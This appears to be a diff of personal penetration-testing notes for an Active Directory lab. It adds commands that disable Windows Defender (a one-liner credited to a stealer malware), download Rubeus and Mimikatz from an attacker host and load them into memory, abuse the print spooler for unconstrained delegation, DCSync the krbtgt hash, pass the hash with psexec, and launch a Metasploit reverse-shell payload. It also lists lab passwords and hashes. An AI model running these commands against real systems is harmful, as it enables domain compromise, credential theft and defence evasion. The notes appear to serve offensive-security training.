@@ -14,7 +14,8 @@
 - alternatively build msbuild xml files you want to run on the system
 - perform post exploit enumeration (WinPeas.ps1/Invoke-Seatbelt)
 - perform active directory enumeration (powerview.ps1/SharpHound.ps1)
-- privesc
+	- note down high value targets (domain admin)
+- privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
 - disable defences
 - after getting system shell migrate to spoolsv
 - use incognito to switch to a user targeted by AD enumeration
@@ -379,6 +380,9 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 # confirm that it works: output should be True
 Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
+
+# disable_defender derived from luna grabber
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; Set-MpPreference -SubmitSamplesConsent 2; Add-MpPreference -ExclusionPath %SystemRoot%\Tasks; Set-MpPreference -ExclusionExtension '.exe'
 ```
 
 ```
@@ -941,14 +945,21 @@ sometimes xfreerdp will not let you rdp even though you have the correct passwor
 ...nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE...
 
 # workaround 1: /sec:tls
-xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /p:lab /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls
 
 # workaround 2: -sec-nla
-xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /p:lab /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla
 
 # both workarounds require to retype the password in the GUI
 # alternative 1: install reminna
 # alternative 2: try rdesktop
+```
+
+```
+# sometimes xfreerdp may fail because there are too many users connected via RDP
+# in your reverse shell
+qwinsta /server:<YourServerName>
+rwinsta /server:<YourServerName> <SessionId>
 ```
 
 ## RDP with DisableRestrictedAdmin
@@ -1559,13 +1570,19 @@ Get-DomainComputer -Unconstrained | Format-Table name, dnshostname, useraccountc
 # you can use the dnshostname property to determine its IP
 nslookup <dnshostname>
 ```
+### enumeration troubleshooting
+```
+Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
+- powerview won't work with local admin, local admin is not domain joined
+- SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspooler bug
+```
 
 ```
 # manual approach: you need a victim to to use a service that has unconstrained delegation
 # in this example: admin user is visiting http://appsrv01 from a client machine which stores the TGT in memory
 # on the appsrv01 machine as user offsec open powershell with admin priv and -ep bypass
-# try with different versions if you still get errors
-. .\Invoke-Mimikatz.ps1
+# try different versions of Invoke-Mimikatz.ps1 if you still get errors
+. .\Invoke-Mimikatz2.ps1
 Invoke-Mimikatz -Command "privilege::debug sekurlsa::tickets"
 # look for ideal Client Name to target that is also forwardable in the flags
 ...
@@ -1582,14 +1599,25 @@ C:\Tools\SysinternalsSuite\PsExec.exe /accepteula \\cdc01 cmd
 # semi-auto approach: force dc to connect to application service using SpoolSample.exe
 # check if print spooler service is running and accessible
 dir \\cdc01\pipe\spoolss
-# with admin priv
-.\Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
+
+# with admin priv load rubeus into memory
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())
+
 # in a seperate terminal
-.\SpoolSample.exe CDC01 APPSRV01
+.\SpoolSample.exe  APPSRV01
+Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
+Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'
+
 # copy and paste the captured base64 encoded ticket
-.\Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...".Split())
+
 # once authenticated as CDC01$ perform dcsync and dump password hash of prod\krbtgt
-lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.246/Invoke-Mimikatz2.ps1")
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
 Domain : prod.corp1.com / S-1-5-21-749318035-33825885-105668094
 ...
 Credentials:
@@ -1622,7 +1650,6 @@ impacket-psexec  -k -no-pass PROD/newAdmin@cdc01.prod.corp1.com -dc-ip 192.168.1
 
 ```
 # clean approach: perform semi-auto approach in the comfort of kali
-
 # prerequisites:
 - admin credentials
 - edit /etc/hosts
@@ -1701,11 +1728,15 @@ impacket-secretsdump -k CDC01.prod.corp1.com -just-dc
 ```
 
 ```
-# after performing DCSync attack with the krbtgt ticket we can use the hash of Local Administrator on the DC to psexec
+# after performing DCSync attack with the krbtgt ticket we can use the hash of Administrator on the DC to psexec
+impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com
+
+alternatively: metasploit
 sudo msfconsole
 use exploit/windows/smb/psexec
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.45.206
+set LHOST 192.168.45.246
+set RHOST 192.168.176.120
 set LPORT 443
 set SMBUser Administrator
 set SMBPass aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
@@ -1754,7 +1785,7 @@ Invoke-Rubeus -Command "s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /
 
 ```
 # example 2: constained delegation with rubeus.txt
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.195/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("purge".Split())
 # use mimikatz to dump lsass then continue below
@@ -1818,6 +1849,15 @@ Invoke-Rubeus -Command "s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438
 # verify and continue attack chain
 klist
 dir \\appsrv01.prod.corp1.com\c$
+```
+
+## kirbi ccache converter
+```
+# kirbi to ccache
+msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.kirbi outputpath=ticket.ccache
+
+# ccache to kirbi
+msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.ccache outputpath=ticket.kirbi
 ```
 
 ## forest
